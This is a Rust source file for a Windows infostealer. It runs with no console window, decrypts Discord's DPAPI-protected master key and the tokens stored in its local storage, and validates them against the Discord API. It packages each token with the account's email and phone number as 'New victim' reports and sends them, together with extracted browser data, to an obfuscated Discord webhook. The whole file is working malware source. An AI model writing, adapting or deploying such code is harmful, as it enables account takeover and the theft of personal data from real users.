#![windows_subsystem = "windows"]

mod browsers;
mod log;

use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
use base64::{engine::general_purpose, Engine as _};
use obfstr::obfstr;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::{collections::{HashMap, HashSet}, env, fs, path::PathBuf};
use regex::Regex;
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
#[derive(Debug, Serialize, Deserialize)]
struct DdU {
    id: String,
    username: String,
    tag: String,
    avatar: Option<String>,
    public_flags: u64,
    email: String,
    phone: String,
}

async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
    let res = client
        .get("https://discord.com/api/v9/users/@me")
        .header("Authorization", token)
        .send()
        .await
        .ok()?;

    if res.status().is_success() {
        let json: Value = res.json().await.ok()?;
        let id = json["id"].as_str()?.to_string();
        let username = json["username"].as_str()?.to_string();
        let discrim = json["discriminator"].as_str().unwrap_or("0");
        let avatar = json["avatar"].as_str().map(|s| s.to_string());
        let public_flags = json["public_flags"].as_u64().unwrap_or(0);
        let email = json["email"].as_str().unwrap_or("N/A").to_string();
        let phone = json["phone"].as_str().unwrap_or("N/A").to_string();

        Some(DdU {
            id,
            username: username.clone(),
            tag: format!("{}#{}", username, discrim),
            avatar,
            public_flags,
            email,
            phone,
        })
    } else {
        None
    }
}

fn badge_emojis(flags: u64) -> Vec<&'static str> {
    let badges = [
        (1 << 0, "<:Badge_Discord_Staff:1365704725646807060>"),
        (1 << 1, "<:DiscordPartner:1365700977570742312>"),
        (1 << 2, "<:HypeSquadEvents:1365704359454834770>"),
        (1 << 3, "<:BugHunter1:1365701008184967278>"),
        (1 << 9, "<:86964earlysupporter:1345831325738995848>"),
        (1 << 6, "<:Bravery:1365701196697829438>"),
        (1 << 7, "<:Brilliance:1365701219602923643>"),
        (1 << 8, "<:Balance:1365701235394482328>"),
        (1 << 14, "<:BugHunter2:1365701027830960259>"),
        (1 << 16, "<:developper:1365704272368500837>"),
        (1 << 17, "<:dev:1365704127103107112>"),
        (1 << 18, "<:ModeratorProgramsAlumni:1365701046256533525>"),
        (1 << 12, "<:NitroClassic:1365701254894419988>"),
        (1 << 13, "<:Nitro:1365701270424199680>"),
        (1 << 17, "<:ServerBooster:1365701285578037760>"),
    ];

    let mut emojis = Vec::new();
    for (bit, emoji) in badges {
        if flags & bit != 0 {
            emojis.push(emoji);
        }
    }
    emojis
}

fn decrypt_master_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {
    let key_data = if encrypted_key.starts_with(b"DPAPI") {
        &encrypted_key[5..]
    } else {
        encrypted_key
    };

    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: key_data.len() as u32,
            pbData: key_data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        if CryptUnprotectData(&mut input, None, None, None, None, 0, &mut output).is_ok() {
            Some(std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec())
        } else {
            None
        }
    }
}

fn decrypt_token(raw_data: &[u8], master_key: &[u8]) -> Option<String> {
    if raw_data.len() < 15 {
        return None;
    }

    let prefix = &raw_data[0..3];
    let (iv, ciphertext) = match prefix {
        b"v10" | b"v11" | b"v20" => {
            if raw_data.len() < 15 {
                return None;
            }
            (&raw_data[3..15], &raw_data[15..])
        }
        _ => {
            if raw_data.len() < 12 {
                return None;
            }
            (&raw_data[0..12], &raw_data[12..])
        }
    };

    if ciphertext.len() < 16 {
        return None;
    }

    let (encrypted_data, tag) = ciphertext.split_at(ciphertext.len() - 16);

    let mut payload = encrypted_data.to_vec();
    payload.extend_from_slice(tag);

    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(master_key));
    let nonce = Nonce::from_slice(iv);

    cipher
        .decrypt(nonce, payload.as_ref())
        .ok()
        .and_then(|d| String::from_utf8(d).ok())
}

fn get_discord_paths() -> HashMap<&'static str, PathBuf> {
    let roaming = PathBuf::from(env::var("APPDATA").unwrap_or_default());
    let mut paths = HashMap::new();
    paths.insert("Discord", roaming.join("discord"));
    paths.insert("DiscordPTB", roaming.join("discordptb"));
    paths.insert("DiscordCanary", roaming.join("discordcanary"));
    paths
}

async fn collect_discord_embeds(client: &reqwest::Client) -> Vec<Value> {
    let mut embeds = Vec::new();
    let mut sent_tokens = HashSet::new();
    let discord_paths = get_discord_paths();

    for (name, path) in discord_paths {
        if !path.exists() {
            logf!("discord skip (missing): {name}");
            continue;
        }
        logf!("discord scan: {name} -> {}", path.display());

        let local_state_path = path.join("Local State");
        let Ok(content) = fs::read_to_string(&local_state_path) else {
            continue;
        };
        let Ok(json_ls) = serde_json::from_str::<Value>(&content) else {
            continue;
        };
        let Some(enc_key) = json_ls["os_crypt"]["encrypted_key"].as_str() else {
            continue;
        };
        let Ok(bytes) = general_purpose::STANDARD.decode(enc_key) else {
            continue;
        };
        let Some(master_key) = decrypt_master_key(&bytes[5..]) else {
            continue;
        };

        if !path.exists() {
            continue;
        }

        let db_path = path.join("Local Storage/leveldb");
        if !db_path.exists() {
            continue;
        }

        let Ok(entries) = fs::read_dir(&db_path) else {
            continue;
        };

        let re = Regex::new(r#"dQw4w9WgXcQ:[^"]+"#).unwrap();
        for entry in entries.flatten() {
            let Ok(file_content) = fs::read(entry.path()) else {
                continue;
            };
            let text = String::from_utf8_lossy(&file_content);
            for cap in re.captures_iter(&text) {
                let b64_part = cap[0]
                    .split("dQw4w9WgXcQ:")
                    .nth(1)
                    .unwrap_or_default()
                    .trim_end_matches('"')
                    .trim_end_matches('\\');
                let Ok(enc_data) = general_purpose::STANDARD.decode(b64_part) else {
                    continue;
                };
                let Some(mut token) = decrypt_token(&enc_data, &master_key) else {
                    continue;
                };
                if !sent_tokens.insert(token.clone()) {
                    unsafe {
                        std::ptr::write_bytes(token.as_mut_ptr(), 0, token.len());
                    }
                    continue;
                }

                logf!("discord token found ({name})");
                if let Some(user) = vt(client, &token).await {
                    let avatar_url = user
                        .avatar
                        .as_ref()
                        .map(|h| {
                            format!(
                                "https://cdn.discordapp.com/avatars/{}/{}.png",
                                user.id, h
                            )
                        })
                        .unwrap_or_else(|| {
                            "https://cdn.discordapp.com/embed/avatars/0.png".to_string()
                        });

                    let badges_display = badge_emojis(user.public_flags).join(" ");
                    let final_badges = if badges_display.is_empty() {
                        "`None`".to_string()
                    } else {
                        badges_display
                    };

                    embeds.push(json!({
                        "title": "<a:clown:1366404450436124702> New victim <a:clown:1366404450436124702>",
                        "color": 0x7289DA,
                        "thumbnail": { "url": avatar_url },
                        "fields": [
                            { "name": "<a:b_diamond:1356277335921262885> Username", "value": format!("`{}`", user.tag), "inline": true },
                            { "name": "<a:dark_butterfly:1441101545465974935> ID", "value": format!("`{}`", user.id), "inline": true },
                            { "name": "<a:flecheblanche:1482614586413682730> Source", "value": name.to_string(), "inline": false },
                            { "name": "<a:flecheblanche:1482614586413682730> Token", "value": format!("```{}```", token), "inline": false },
                            { "name": "<a:all_discord_badges_gif:1157698511320653924> Badges", "value": final_badges, "inline": false },
                            { "name": "<a:dark_butterfly:1441101545465974935> Email", "value": format!("`{}`", user.email), "inline": false },
                            { "name": "<a:dark_butterfly:1441101545465974935> Phone", "value": format!("`{}`", user.phone), "inline": false }
                        ],
                        "footer": { "text": "VVS V3" },
                        "timestamp": chrono::Utc::now().to_rfc3339()
                    }));
                }

                unsafe {
                    std::ptr::write_bytes(token.as_mut_ptr(), 0, token.len());
                }
            }
        }
    }

    logf!("discord tokens collected: {}", embeds.len());
    embeds
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(debug_assertions)]
    log::init();
    logs!("=== START ===");
    browsers::chrome_inject::cleanup_legacy_artifacts();

    let p1 = obfstr!("https://discord.com/api/").to_string();
    let p2 = obfstr!("webhooks/1529195936272613640/").to_string();
    let p3 = obfstr!("QBRdpSpgeJkbg0OGdt1_tFVhwsX8q8VpKYFZH5HXJrTm5No6DpgiPT2iKwZUv6p8FDXd").to_string();
    let mut wbh = format!("{}{}{}", p1, p2, p3);
    let client = reqwest::Client::new();

    logs!("discord scan + browser extract (parallel)...");
    let browser_handle = tokio::task::spawn_blocking(browsers::extract_all);
    let embeds = collect_discord_embeds(&client).await;
    let browser_files = browser_handle.await.unwrap_or_default();

    logs!("webhook send (combined)...");
    match browsers::sender::send_combined(&client, &wbh, embeds, &browser_files).await {
        Ok(()) => logs!("webhook send OK"),
        Err(e) => {
            logf!("webhook send ERR: {e}");
            let _ = e;
        }
    }

    unsafe {
        std::ptr::write_bytes(wbh.as_mut_ptr(), 0, wbh.len());
    }

    logs!("=== DONE ===");
    Ok(())
}
